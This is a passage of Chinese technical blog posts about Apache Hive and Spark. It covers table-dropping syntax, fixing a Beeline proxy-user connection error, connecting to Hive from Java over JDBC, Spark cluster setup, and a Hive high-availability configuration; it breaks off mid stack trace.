</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*基础语法*/</span> </span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] table_name [<span class="keyword">PURGE</span>];  <span class="comment">-- ( PURGE 0.14.0后可用)</span></span><br></pre></td></tr></table></figure>
<p>DROP TABLE 为该表删除元数据和数据。数据实际上被转移到了。如果配置了垃圾(并没有指定清除)，则会使用垃圾/当前目录。元数据完全丢失了。<br>当删除一个外部表时，表中的数据将不会从文件系统中删除。</p>
<p>当删除一个由视图引用的表时，没有给出警告(视图被保留为无效的，并且必须由用户删除或重新创建)。<br>否则，表信息将从转移中删除，原始数据将被删除，就像“hadoop dfs-rm”一样。在许多情况下，这将导致表数据被移动到用户的.Trash 主目录中。因此，误删表的用户可以通过重新创建具有相同模式的表，重新创建任何必要的分区，然后使用Hadoop将数据重新移动到位置，从而能够恢复丢失的数据。这个解决方案随着时间的推移或跨安装的变化而变化，因为它依赖于底层实现;用户不可随意删除表.</p>
<p>如果指定了PURGE，表数据就不会进入.Trash/current user,也无法恢复因DROP误删的数据。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*删除数据*/</span></span><br><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> partition_spec];</span><br><span class="line"></span><br><span class="line">partition_spec:</span><br><span class="line">  : (partition_column = partition_col_value, partition_column = partition_col_value, ...)</span><br></pre></td></tr></table></figure>
<p>从表或分区中删除所有行。如果文件系统的Trash被启用，这些行将被丢弃并放入Trash中,否则它们将被删除。当前目标表应该是native/managed 的表，否则将抛出一个异常。用户可以指定部分分区，同时删除多个分区，而省略分区则会截断表中的所有分区。<br>“auto.purge”属性如果设置为true,则直接删除数据,不放入回收站。建议设置为false。</p>
<h1 id="Beeline-命令行界面"><a href="#Beeline-命令行界面" class="headerlink" title="Beeline 命令行界面"></a>Beeline 命令行界面</h1><p>首先启动hiveserver2服务,再启动beeline,连接出错.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[main]: WARN jdbc.HiveConnection: Failed to connect to localhost:10000</span><br><span class="line">Error: Could not open client transport with JDBC Uri: jdbc:hive2://localhost:10000: Failed to open new session: java.lang.RuntimeException: org.apache.hadoop.ipc.RemoteException(org.apache.hadoop.security.authorize.AuthorizationException): User: root is not allowed to impersonate scott (state=08S01,code=0)</span><br></pre></td></tr></table></figure>
<p>打开hadoop core-site.xml,添加下面信息,重新启动.</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.root.hosts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.proxyuser.root.groups<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>*<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">``</span><br><span class="line">再次连接,正常进入</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">beeline&gt; !connect jdbc:hive2://localhost:10000 root 123456</span><br><span class="line">Connecting to jdbc:hive2://localhost:10000</span><br><span class="line">Connected to: Apache Hive (version 2.3.0)</span><br><span class="line">Driver: Hive JDBC (version 2.3.0)</span><br><span class="line">Transaction isolation: TRANSACTION_REPEATABLE_READ</span><br><span class="line">0: jdbc:hive2://localhost:10000&gt; show databases;</span><br><span class="line">+----------------+</span><br><span class="line">| database_name  |</span><br><span class="line">+----------------+</span><br><span class="line">| default        |</span><br><span class="line">| test           |</span><br><span class="line">| test2          |</span><br><span class="line">+----------------+</span><br><span class="line">3 rows selected (0.449 seconds)</span><br><span class="line">0: jdbc:hive2://localhost:10000&gt; !help</span><br><span class="line">!addlocaldriverjar  Add driver jar file in the beeline client side.</span><br><span class="line">!addlocaldrivername Add driver name that needs to be supported in the beeline</span><br><span class="line">                    client side.</span><br><span class="line">!all                Execute the specified SQL against all the current connections</span><br><span class="line">!autocommit         Set autocommit mode on or off</span><br><span class="line">!batch              Start or execute a batch of statements</span><br><span class="line">!brief              Set verbose mode off</span><br><span class="line">!call               Execute a callable statement</span><br><span class="line">!close              Close the current connection to the database</span><br><span class="line">!closeall           Close all current open connections</span><br><span class="line">!columns            List all the columns for the specified table</span><br><span class="line">!commit             Commit the current transaction (if autocommit is off)</span><br><span class="line">!connect            Open a new connection to the database.</span><br><span class="line">!dbinfo             Give metadata information about the database</span><br><span class="line">!describe           Describe a table</span><br><span class="line">!dropall            Drop all tables in the current database</span><br><span class="line">!exportedkeys       List all the exported keys for the specified table</span><br><span class="line">!go                 Select the current connection</span><br><span class="line">!help               Print a summary of command usage</span><br><span class="line">!history            Display the command history</span><br><span class="line">!importedkeys       List all the imported keys for the specified table</span><br><span class="line">!indexes            List all the indexes for the specified table</span><br><span class="line">!isolation          Set the transaction isolation for this connection</span><br><span class="line">!list               List the current connections</span><br><span class="line">!manual             Display the BeeLine manual</span><br><span class="line">!metadata           Obtain metadata information</span><br><span class="line">!nativesql          Show the native SQL for the specified statement</span><br><span class="line">!nullemptystring    Set to true to get historic behavior of printing null as</span><br><span class="line">                    empty string. Default is false.</span><br><span class="line">!outputformat       Set the output format for displaying results</span><br><span class="line">                    (table,vertical,csv2,dsv,tsv2,xmlattrs,xmlelements, and</span><br><span class="line">                    deprecated formats(csv, tsv))</span><br><span class="line">!primarykeys        List all the primary keys for the specified table</span><br><span class="line">!procedures         List all the procedures</span><br><span class="line">!properties         Connect to the database specified in the properties file(s)</span><br><span class="line">!quit               Exits the program</span><br><span class="line">!reconnect          Reconnect to the database</span><br><span class="line">!record             Record all output to the specified file</span><br><span class="line">!rehash             Fetch table and column names for command completion</span><br><span class="line">!rollback           Roll back the current transaction (if autocommit is off)</span><br><span class="line">!run                Run a script from the specified file</span><br><span class="line">!save               Save the current variabes and aliases</span><br><span class="line">!scan               Scan for installed JDBC drivers</span><br><span class="line">!script             Start saving a script to a file</span><br><span class="line">!set                Set a beeline variable</span><br><span class="line">!sh                 Execute a shell command</span><br><span class="line">!sql                Execute a SQL command</span><br><span class="line">!tables             List all the tables in the database</span><br><span class="line">!typeinfo           Display the type map for the current connection</span><br><span class="line">!verbose            Set verbose mode on</span><br><span class="line"></span><br><span class="line">Comments, bug reports, and patches go to ???</span><br><span class="line">0: jdbc:hive2://localhost:10000&gt; show tables;</span><br><span class="line">+-----------+</span><br><span class="line">| tab_name  |</span><br><span class="line">+-----------+</span><br><span class="line">| users     |</span><br><span class="line">+-----------+</span><br><span class="line">1 row selected (0.246 seconds)</span><br><span class="line"></span><br><span class="line">0: jdbc:hive2://localhost:10000&gt; !quit</span><br><span class="line">Closing: 0: jdbc:hive2://localhost:10000</span><br></pre></td></tr></table></figure>
<h2 id="JAVA-API连接HIVE"><a href="#JAVA-API连接HIVE" class="headerlink" title="JAVA API连接HIVE"></a>JAVA API连接HIVE</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.8</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HiveLearn</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DRIVER_NAME = <span class="string">"org.apache.hive.jdbc.HiveDriver"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String url = <span class="string">"jdbc:hive2://hadoop01:10000/default"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String username = <span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String password = <span class="string">"123456"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Connection connection = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Statement statement = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(DRIVER_NAME);</span><br><span class="line">            connection = DriverManager.getConnection(url,username,password);</span><br><span class="line">            statement = connection.createStatement();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取所有数据库信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">getDatabases</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String sql = <span class="string">"SHOW DATABASES"</span>;</span><br><span class="line">        List&lt;String&gt; databases = Lists.newArrayList();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ResultSet rs = statement.executeQuery(sql);</span><br><span class="line">            <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">                databases.add(rs.getString(<span class="string">"database_name"</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> databases;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><blockquote>
<ul>
<li>Hive权威指南</li>
<li><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual" target="_blank" rel="noopener">LanguageManual</a></li>
<li><a href="http://www.hplsql.org/doc" target="_blank" rel="noopener">HPL/SQL-Procedural SQL on Hadoop,NoSQL and RDBMS</a></li>
<li><a href="https://hortonworks.com/blog/hive-0-14-cost-based-optimizer-cbo-technical-overview/" target="_blank" rel="noopener">Cost Based Optimizer (CBO) Technical Overview</a></li>
<li><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+ORC#LanguageManualORC-HiveQLSyntax" target="_blank" rel="noopener">ORC Files</a></li>
<li><a href="https://en.wikipedia.org/wiki/RCFile" target="_blank" rel="noopener">RCFile</a></li>
<li><a href="https://cwiki.apache.org/confluence/display/Hive/SerDe" target="_blank" rel="noopener">SerDe</a></li>
<li><a href="https://cwiki.apache.org/confluence/display/Hive/HiveServer2+Clients#HiveServer2Clients-Beeline%E2%80%93CommandLineShell" target="_blank" rel="noopener">HiveServer2 Clients</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title>Spark环境搭建</title>
    <url>/2017/10/26/%E5%A4%A7%E6%95%B0%E6%8D%AE/Spark%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<blockquote>
<h6 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h6><ul>
<li>JDK(1.8)</li>
<li>Scala(2.12)</li>
<li>Spark(2.2) </li>
</ul>
<h1 id="一、Spark环境配置"><a href="#一、Spark环境配置" class="headerlink" title="一、Spark环境配置"></a>一、Spark环境配置</h1><h3 id="1-1-配置"><a href="#1-1-配置" class="headerlink" title="1.1 配置"></a>1.1 配置</h3></blockquote>
<p>spark-env.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#JAVA home</span></span><br><span class="line">JAVA_HOME=/usr/share/java</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定hadoop配置文件</span></span><br><span class="line">HADOOP_CONF_HOME=/opt/hadoop/hadoop-2.7.4/etc/hadoop</span><br></pre></td></tr></table></figure>
<p>slaves</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop03</span><br><span class="line">hadoop04</span><br><span class="line">hadoop05</span><br></pre></td></tr></table></figure>
<blockquote>
<h3 id="1-2-启动"><a href="#1-2-启动" class="headerlink" title="1.2 启动"></a>1.2 启动</h3></blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动所有</span></span><br><span class="line">/opt/hadoop/spark-2.2.0/sbin/start-all.sh</span><br></pre></td></tr></table></figure>
<p>访问web界面：<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p>
<p><img src="https://i.imgur.com/0K9PMeQ.png" alt></p>
<blockquote>
<h3 id="1-3-spark-shell"><a href="#1-3-spark-shell" class="headerlink" title="1.3 spark shell"></a>1.3 spark shell</h3></blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进入spark-shell</span></span><br><span class="line">/opt/hadoop/spark-2.2.0/bin/spark-shell</span><br></pre></td></tr></table></figure>
<p>执行简单脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#从本地磁盘读取文件</span></span><br><span class="line">scala&gt; val f = sc.textFile(<span class="string">"file:/root/zookeeper.out"</span>)</span><br><span class="line">f: org.apache.spark.rdd.RDD[String] = file:/root/zookeeper.out MapPartitionsRDD[5] at textFile at &lt;console&gt;:24</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行wordcount 输出</span></span><br><span class="line">scala&gt; f.flatMap(_.split(<span class="string">" "</span>)).map(w =&gt; (w,1)).reduceByKey(_+_).collect()</span><br><span class="line">res3: Array[(String, Int)] = Array((environment:os.arch=amd64,1), (20:23:34,719,1), (20:23:35,726,3), ([QuorumPeer[myid=1]/0:0:0:0:0:0:0:0:2181:QuorumPeer@844],1), (attempting,2), (2017-10-26,91), ((message,4), (3200,1), (snapshot,1), (20:23:51,239,10), (Got,1), (20:23:51,209,1), (20:23:35,725,1), (environment:user.home=/root,1), (hadoop02,9), (20:23:38,135,1), ([QuorumPeer[myid=1]/0:0:0:0:0:0:0:0:2181:FastLeaderElection@852],6), (session,4), (20:23:51,257,1), (environment:os.name=Linux,1), (from:,1), ([main:FileSnap@83],1), (TOOK,1), (WARN,16), ([QuorumPeer[myid=1]/0:0:0:0:0:0:0:0:2181:Follower@116],1), (connection,5), (Corporation,1), (task,1), (20:23:51,214,1), ([SyncThread:1:FileTxnLog@203],1), (Accepted,2), (the,1), (quorum,1), (address:,19), (0.0.0.0/0.0.0.0:2181,1), (Creating,1),...</span><br><span class="line">scala&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>Hive HA环境搭建</title>
    <url>/2021/07/20/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hive%20HA%20%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Hive-HA-搭建"><a href="#Hive-HA-搭建" class="headerlink" title="Hive HA 搭建"></a>Hive HA 搭建</h1><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote>
<ul>
<li>Hive 3.1.2</li>
<li>Hadoop 3.2.2</li>
<li>JDK 1.8</li>
</ul>
</blockquote>
<h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><h2 id="hive-env-sh"><a href="#hive-env-sh" class="headerlink" title="hive-env.sh"></a><a href="http://hive-env.sh" target="_blank" rel="noopener">hive-env.sh</a></h2><p>复制一份hive-env.sh.template 为hive-env.sh，添加以下内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span>  HADOOP_HOME=/opt/hadoop-3.2.2/</span><br><span class="line"><span class="built_in">export</span>  HIVE_CONF_DIR=/opt/hive-3.1.2/conf</span><br><span class="line"><span class="built_in">export</span>  HIVE_AUX_JARS_PATH=/opt/hive-3.1.2/lib</span><br></pre></td></tr></table></figure>
<h1 id="hive-site-xml"><a href="#hive-site-xml" class="headerlink" title="hive-site.xml"></a>hive-site.xml</h1><p>复制一份hive-default.xml.template 为hive-site.xml，修改以下内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 指定mysql的连接 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionURL<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>jdbc:mysql://hadoop01:3306/hive?createDatabaseIfNotExist=true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定驱动类 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionDriverName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 指定用户名 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionUserName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>root<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定密码 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionPassword<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 该属性为空表示嵌入模式或本地模式，否则为远程模式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.uris<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>thrift://hadoop01:9083,thrift://hadoop02:9083,thrift://hadoop03:9083<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">description</span>&gt;</span>Thrift URI for the remote metastore. Used by metastore client to connect to remote metastore.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop01,hadoop02,hadoop03<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      List of ZooKeeper servers to talk to. This is needed for: </span><br><span class="line">      1. Read/write locks - when hive.lock.manager is set to </span><br><span class="line">      org.apache.hadoop.hive.ql.lockmgr.zookeeper.ZooKeeperHiveLockManager, </span><br><span class="line">      2. When HiveServer2 supports service discovery via Zookeeper.</span><br><span class="line">      3. For delegation token storage if zookeeper store is used, if</span><br><span class="line">      hive.cluster.delegation.token.store.zookeeper.connectString is not set</span><br><span class="line">      4. LLAP daemon registry service</span><br><span class="line">      5. Leader selection for privilege synchronizer</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.zookeeper.client.port<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>2181<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      The port of ZooKeeper servers to talk to.</span><br><span class="line">      If the list of Zookeeper servers specified in hive.zookeeper.quorum</span><br><span class="line">      does not contain port numbers, this value is used.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.zookeeper.session.timeout<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>1200000ms<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      Expects a time value with unit (d/day, h/hour, m/min, s/sec, ms/msec, us/usec, ns/nsec), which is msec if not specified.</span><br><span class="line">      ZooKeeper client's session timeout (in milliseconds). The client is disconnected, and as a result, all locks released, </span><br><span class="line">      if a heartbeat is not sent in the timeout.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.zookeeper.connection.timeout<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>15s<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></span><br><span class="line">      Expects a time value with unit (d/day, h/hour, m/min, s/sec, ms/msec, us/usec, ns/nsec), which is sec if not specified.</span><br><span class="line">      ZooKeeper client's connection timeout in seconds. Connection timeout * hive.zookeeper.connection.max.retries</span><br><span class="line">      with exponential backoff is when curator client deems connection is lost to zookeeper.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--启用hiverserver2高可用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.active.passive.ha.enable<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Whether HiveServer2 Active/Passive High Availability be enabled when Hive Interactive sessions are enabled.This will also require hive.server2.support.dynamic.service.discovery to be enabled.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--自动服务发现--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.support.dynamic.service.discovery<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Whether HiveServer2 supports dynamic service discovery for its clients. To support this, each instance of HiveServer2 currently uses ZooKeeper to register itself, when it is brought up. JDBC/ODBC clients should use the ZooKeeper ensemble: hive.zookeeper.quorum in their connection string.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--zk中的namespace--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.server2.zookeeper.namespace<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hiveserver2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>The parent node in ZooKeeper used by HiveServer2 when supporting dynamic service discovery.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>指定数据库连接，存放hive的元数据信息。</p>
<h2 id="启动、测试"><a href="#启动、测试" class="headerlink" title="启动、测试"></a>启动、测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动metastore</span></span><br><span class="line">hive --service metastore &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动hiveserver2</span></span><br><span class="line">hive --service hiveserver2 &amp;</span><br></pre></td></tr></table></figure>
<p>启动成功后, 进入hadoop01:10002 可以看到图形界面。</p>
<p><img src="/2021/07/20/大数据/Hive HA 搭建/success.png" alt></p>
<p>beeline连接测试：</p>
<p>进入beeline命令行界面，输入 !connect jdbc:hive2://hadoop01:10000，显示以下信息表示连接成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beeline&gt; !connect jdbc:hive2://hadoop01:10000</span><br><span class="line">Connecting to jdbc:hive2://hadoop01:10000</span><br><span class="line">Enter username <span class="keyword">for</span> jdbc:hive2://hadoop01:10000: hadoop</span><br><span class="line">Enter password <span class="keyword">for</span> jdbc:hive2://hadoop01:10000: *********</span><br><span class="line">Connected to: Apache Hive (version 3.1.2)</span><br><span class="line">Driver: Hive JDBC (version 3.1.2)</span><br><span class="line">Transaction isolation: TRANSACTION_REPEATABLE_READ</span><br></pre></td></tr></table></figure>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><h2 id="1-com-google-common-base-Preconditions-checkArgument"><a href="#1-com-google-common-base-Preconditions-checkArgument" class="headerlink" title="1. com.google.common.base.Preconditions.checkArgument"></a>1. com.google.common.base.Preconditions.checkArgument</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SLF4J: Actual binding is of <span class="built_in">type</span> [org.apache.logging.slf4j.Log4jLoggerFactory]</span><br><span class="line">Exception <span class="keyword">in</span> thread <span class="string">"main"</span> java.lang.NoSuchMethodError: com.google.common.base.Preconditions.checkArgument(ZLjava/lang/String;Ljava/lang/Object;)V</span><br><span class="line">        at org.apache.hadoop.conf.Configuration.set(Configuration.java:1357)</span><br><span class="line">        at org.apache.hadoop.conf.Configuration.set(Configuration.java:1338)</span><br><span class="line">        at org.apache.hadoop.mapred.JobConf.setJar(JobConf.java:536)</span><br><span class="line">        at org.apache.hadoop.mapred.JobConf.setJarByClass(JobConf.java:554)</span><br><span class="line">        at org.apache.hadoop.mapred.JobConf.&lt;init&gt;(JobConf.java:448)</span><br><span class="line">        at org.apache.hadoop.hive.conf.HiveConf.initialize(HiveConf.java:5141)</span><br><span class="line">        at org.apache.hadoop.hive.conf.HiveConf.&lt;init&gt;(HiveConf.java:5099)</span><br><span class="line">        at org.apache.hadoop.hive.common.LogUtils.initHiveLog4jCommon(LogUtils.java:97)</span><br><span class="line">        at org.apache.hadoop.hive.common.LogUtils.initHiveLog4j(LogUtils.java:81)</span><br><span class="line">        at org.apache.hadoop.hive.cli.CliDriver.run(CliDriver.java:699)</span><br><span class="line">        at org.apache.hadoop.hive.cli.CliDriver.main(CliDriver.java:683)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">        at 